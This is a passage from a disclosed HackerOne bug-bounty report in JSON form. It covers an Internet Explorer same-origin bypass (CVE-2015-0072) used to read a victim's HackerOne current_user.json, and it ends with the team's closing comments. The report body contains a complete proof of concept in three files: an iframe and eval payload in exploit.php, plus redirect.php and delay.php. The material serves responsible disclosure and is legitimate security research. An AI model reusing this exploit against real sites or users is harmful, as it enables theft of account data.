            "markdown_message": "<p>Hey <a href=\"/avlidienbrunn\">@avlidienbrunn</a>,</p>\n\n<p>Thanks for your mitigation suggestions. You inspired me of another idea that may stop this attack. We can make a whitelist of domains allowed in <code>Referer:</code> header which is being sent in framed resource request by IE and if the <code>Referer</code> is not in the whitelist just redirect to a sandboxed domain showing a message thus SOP bypass will end up to the sandboxed domain. I can&#39;t confirm this will work as I didn&#39;t test it.</p>\n\n<p>Thanks;</p>\n", 
            "type": "Activities::Comment", 
            "id": 744307, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-12T05:23:44.042Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-12T05:23:44.042Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "I'm going to close this out as Informative for now. The IE issue is fixed, and [as of tomorrow](https://www.microsoft.com/en-us/WindowsForBusiness/End-of-IE-support), most IE versions will be EOL'd. Hoping folks move over to Edge soon so basic things like CSP and other mitigations Just Works(TM).\n\nWe'll revisit this if something else comes up. The Rails per-form CSRF token patch did land at least, so Rails 5 will have that mitigation built-in. That should be released in the coming months, so we'll pick that up once we upgrade.\n\nYou both gave some great ideas on mitigation strategies for this and other issues, and we'll take those into account as well as we would to improve the platform's security. Thank you!", 
            "markdown_message": "<p>I&#39;m going to close this out as Informative for now. The IE issue is fixed, and <a href=\"/redirect?signature=df34c95caf30cbc2b86d640486f81533cbbeee35&amp;url=https%3A%2F%2Fwww.microsoft.com%2Fen-us%2FWindowsForBusiness%2FEnd-of-IE-support\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>as of tomorrow</span><i class=\"icon-external-link\"></i></a>, most IE versions will be EOL&#39;d. Hoping folks move over to Edge soon so basic things like CSP and other mitigations Just Works(TM).</p>\n\n<p>We&#39;ll revisit this if something else comes up. The Rails per-form CSRF token patch did land at least, so Rails 5 will have that mitigation built-in. That should be released in the coming months, so we&#39;ll pick that up once we upgrade.</p>\n\n<p>You both gave some great ideas on mitigation strategies for this and other issues, and we&#39;ll take those into account as well as we would to improve the platform&#39;s security. Thank you!</p>\n", 
            "type": "Activities::BugInformative", 
            "id": 754260, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-03T20:57:13.908Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-03T20:57:13.908Z", 
            "actor": {
                "username": "zombiehelp54", 
                "url": "/zombiehelp54", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/135/c516ce1105e1acc352bfce4d78437074fb37cc11_medium.jpg?1534236188"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Ping!", 
            "markdown_message": "<p>Ping!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1172022, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-19T13:44:19.338Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-19T13:44:19.338Z", 
            "actor": {
                "username": "zombiehelp54", 
                "url": "/zombiehelp54", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/135/c516ce1105e1acc352bfce4d78437074fb37cc11_medium.jpg?1534236188"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "first_to_agree": true, 
            "message": "Hey guys,\nIs it possible to disclose this one?\n\nThanks!", 
            "markdown_message": "<p>Hey guys,<br>\nIs it possible to disclose this one?</p>\n\n<p>Thanks!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1621042, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-19T18:16:55.889Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-19T18:16:55.889Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1621759, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-19T18:16:55.915Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-19T18:16:55.915Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1621760, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "zombiehelp54", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/zombiehelp54", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/036/135/a1e84d9d7dd80d2da82bb4f35395578fe22ba64a_small.jpg?1534236188"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 45, 
        "name": "Cross-Site Request Forgery (CSRF)"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2017-04-19T18:16:55.902Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/108056", 
    "created_at": "2016-01-04T11:34:44.163Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi, I have managed to leverage CVE 2015-0072, so that the attack will work with any framed resource protected by <code>X-Frame-Options: DENY</code> header.<br>\nAccording to <a href=\"/reports/103787\">#103787</a>, only <a title=\"https://hackerone.com/cdn-cgi/trace\" href=\"https://hackerone.com/cdn-cgi/trace\">https://hackerone.com/cdn-cgi/trace</a> was unprotected and now its already fixed. In my PoC I used several X-Frame-Options protected resources of HackerOne and the attack was executed successfully.</p>\n\n<h2 id=\"proof-of-concept\">Proof Of Concept</h2>\n\n<ol>\n<li>exploit.php</li>\n</ol>\n\n<p>I added alert() message after executing the payload (read content of current_user.json) because responseText  wasn&#39;t readable as steadyState stick at 1 and status at 0</p>\n<pre class=\"highlight plaintext\"><code>&lt;iframe src=&quot;redirect.php?&lt;? echo rand(); ?&gt;&quot; style=&quot;&quot;&gt;&lt;/iframe&gt;\n&lt;iframe src=&quot;https://hackerone.com/assets/news/vulnerabilities_fixed/vulnfixed-652ab9bb4eac2826a0fc8a2fae551115.png?&lt;? echo rand(); ?&gt;&quot; style=&quot;&quot;&gt;&lt;/iframe&gt;\n&lt;script&gt;\ntop[0].eval(&#39;_=top[1];xhttp=new XMLHttpRequest();xhttp.open(&quot;get&quot;,&quot;delay.php?&lt;? echo rand(); ?&gt;&quot;,false);xhttp.send(); _.location=&quot;javascript:http=new XMLHttpRequest(); url=\\&#39;https://hackerone.com/current_user.json\\&#39;;http.open(\\&#39;GET\\&#39;, url, true);http.onreadystatechange = function(){if(http.readyState == 4 &amp;&amp; http.status == 200)console.log(http.responseText);}; http.send(); alert(\\&#39;No need to close this, already done!\\&#39;); &quot;&#39;);\n&lt;/script&gt;\n</code></pre>\n<p>2- redirect.php</p>\n<pre class=\"highlight plaintext\"><code>&lt;?php \nheader(&quot;Location: https://hackerone.com/assets/news/vulnerabilities_fixed/vulnfixed-652ab9bb4eac2826a0fc8a2fae551115.png?&quot;.rand()); \nexit(); \n?&gt;\n</code></pre>\n<p>3- delay.php</p>\n<pre class=\"highlight plaintext\"><code>&lt;?php \nsleep(5);\necho &quot;zombiehelp54&quot;;\nexit(); \n?&gt;\n</code></pre>\n<h2 id=\"live-poc\">Live PoC</h2>\n\n<p>I have tested this live PoC on my IE 11.0.9600.17.633 updated February 2015 and also on IE 11 of Windows Server 2012 R2 and it worked as expected (see screenshots).<br>\nI also tried many resources of HackerOne and all is X-Frame-Options protected.<br>\nJust open any  vulnerable IE (9,10,11 without MS15-018 applied) and turn on console<br>\nGo to <a title=\"http://alazzazpp.com/myuxss/exploit.php\" href=\"/redirect?signature=4b93ca26380636165b753a21792308b592347074&amp;url=http%3A%2F%2Falazzazpp.com%2Fmyuxss%2Fexploit.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://alazzazpp.com/myuxss/exploit.php</span><i class=\"icon-external-link\"></i></a> and your current_user.json will be logged to console.</p>\n\n<p>I couldn&#39;t find a mitigation to this, I hope you do.<br>\nThanks;</p>\n", 
    "vulnerability_information": "Hi, I have managed to leverage CVE 2015-0072, so that the attack will work with any framed resource protected by `X-Frame-Options: DENY` header.\nAccording to #103787, only https://hackerone.com/cdn-cgi/trace was unprotected and now its already fixed. In my PoC I used several X-Frame-Options protected resources of HackerOne and the attack was executed successfully.\n\nProof Of Concept\n--------------------------\n1. exploit.php\n\nI added alert() message after executing the payload (read content of current_user.json) because responseText  wasn't readable as steadyState stick at 1 and status at 0\n\n```\n<iframe src=\"redirect.php?<? echo rand(); ?>\" style=\"\"></iframe>\n<iframe src=\"https://hackerone.com/assets/news/vulnerabilities_fixed/vulnfixed-652ab9bb4eac2826a0fc8a2fae551115.png?<? echo rand(); ?>\" style=\"\"></iframe>\n<script>\ntop[0].eval('_=top[1];xhttp=new XMLHttpRequest();xhttp.open(\"get\",\"delay.php?<? echo rand(); ?>\",false);xhttp.send(); _.location=\"javascript:http=new XMLHttpRequest(); url=\\'https://hackerone.com/current_user.json\\';http.open(\\'GET\\', url, true);http.onreadystatechange = function(){if(http.readyState == 4 && http.status == 200)console.log(http.responseText);}; http.send(); alert(\\'No need to close this, already done!\\'); \"');\n</script>\n```\n\n2- redirect.php\n\n```\n<?php \nheader(\"Location: https://hackerone.com/assets/news/vulnerabilities_fixed/vulnfixed-652ab9bb4eac2826a0fc8a2fae551115.png?\".rand()); \nexit(); \n?>\n```\n\n3- delay.php\n\n```\n<?php \nsleep(5);\necho \"zombiehelp54\";\nexit(); \n?>\n```\n\nLive PoC\n---------------\nI have tested this live PoC on my IE 11.0.9600.17.633 updated February 2015 and also on IE 11 of Windows Server 2012 R2 and it worked as expected (see screenshots).\nI also tried many resources of HackerOne and all is X-Frame-Options protected.\nJust open any  vulnerable IE (9,10,11 without MS15-018 applied) and turn on console\nGo to http://alazzazpp.com/myuxss/exploit.php and your current_user.json will be logged to console.\n\nI couldn't find a mitigation to this, I hope you do.\nThanks;\n\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://hackerone.com", 
            "about": "Vulnerability disclosure should be safe, transparent, and rewarding.", 
            "twitter_handle": "Hacker0x01", 
            "name": "HackerOne"
        }, 
        "handle": "security", 
        "url": "https://hackerone.com/security", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/013/68fea1fe00dc833f4109e015738af4b374727e56_small.png?1445331713", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/013/28af2ada2cc00aa9427504fc5a14f587362df84b_medium.png?1445331713"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 13, 
        "default_currency": "usd"
    }, 
    "is_published": false
}